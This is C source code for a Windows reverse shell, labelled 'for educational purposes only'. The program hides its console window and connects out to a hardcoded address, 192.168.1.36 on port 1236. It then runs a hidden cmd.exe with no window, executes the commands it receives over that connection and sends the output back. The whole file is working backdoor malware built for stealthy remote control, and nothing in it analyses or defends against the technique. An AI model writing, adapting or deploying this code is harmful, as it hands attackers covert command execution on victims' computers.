//tool made by B4shCr00k
//For educational purposes only
#include <stdio.h>
#include <stdlib.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winbase.h>

#pragma comment (lib, "Ws2_32.lib")

void CreateChildProcess(PROCESS_INFORMATION *pi);
void WriteToPipe(const char *command);
void ReadFromPipe(SOCKET sock);

HANDLE hRead_in = NULL;
HANDLE hWrite_in = NULL;
HANDLE hRead_out = NULL;
HANDLE hWrite_out = NULL;

int main() {
    SOCKET sock;
    struct sockaddr_in sock_addr;
    char recvserver[8000];
    WSADATA wsa;
    char ip_addr[] = "192.168.1.36";
    int port = 1236;
    SECURITY_ATTRIBUTES sa;
    HWND stealth;
    PROCESS_INFORMATION pi;

    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    sock_addr.sin_port = htons(port);
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_addr.s_addr = inet_addr(ip_addr);

    int connection = WSAConnect(sock, (SOCKADDR*)&sock_addr, sizeof(sock_addr), NULL, NULL, NULL, NULL);

    if (!CreatePipe(&hRead_in, &hWrite_in, &sa, 0)) {
        printf("Error creating input pipe\n");
        return 1;
    }
    if (!SetHandleInformation(hWrite_in, HANDLE_FLAG_INHERIT, 0)) {
        printf("Error setting handle information\n");
        return 1;
    }

    if (!CreatePipe(&hRead_out, &hWrite_out, &sa, 0)) {
        printf("Error creating output pipe\n");
        return 1;
    }
    if (!SetHandleInformation(hRead_out, HANDLE_FLAG_INHERIT, 0)) {
        printf("Error setting handle information\n");
        return 1;
    }

   
    CreateChildProcess(&pi);

    while (1) {
        recv(sock,recvserver,sizeof(recvserver),0);

        if (strcmp(recvserver, "exit") == 0) {
            break; 
        }

       
        WriteToPipe(recvserver);
        Sleep(2000);
        ReadFromPipe(sock);
    }
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hWrite_in);
    CloseHandle(hRead_out);

   

    return 0;
}

void CreateChildProcess(PROCESS_INFORMATION *pi) {
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite_out;
    si.hStdError = hWrite_out;
    si.hStdInput = hRead_in;

    
    if (!CreateProcess(NULL, "cmd.exe /Q /K", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, pi)) {
        printf("CreateProcess failed (%d)\n", GetLastError());
        exit(1);
    }
}

void WriteToPipe(const char *recvserver) {
    DWORD dwWritten;
    char command[1000];

    
    snprintf(command, sizeof(command), "%s\n", recvserver);
    
    if (!WriteFile(hWrite_in, command, strlen(command), &dwWritten, NULL)) {
        printf("Error writing to pipe\n");
    }
}

void ReadFromPipe(SOCKET sock) {
    DWORD dwRead;
    CHAR chBuf[4096];
    DWORD bytesAvailable;
    int bytecounter;
    bytecounter = 0;

    while (1) {

        if (!PeekNamedPipe(hRead_out, NULL, 0, NULL, &bytesAvailable, NULL)) {
            printf("Error checking pipe\n");
            break;
        }

        if (bytesAvailable == 0) {
            bytecounter++;
            if (bytecounter > 10) { 
                break;
            }
            Sleep(500);
            continue;
        }
        
        

        
        
        BOOL success = ReadFile(hRead_out, chBuf, sizeof(chBuf) - 1, &dwRead, NULL);
        if (!success || dwRead == 0) break; // Stop reading if nothing was read

        chBuf[dwRead] = '\0'; // Null-terminate the buffer
        send(sock,chBuf,sizeof(chBuf),0);

    }
    WSACleanup();
    closesocket(sock);



}
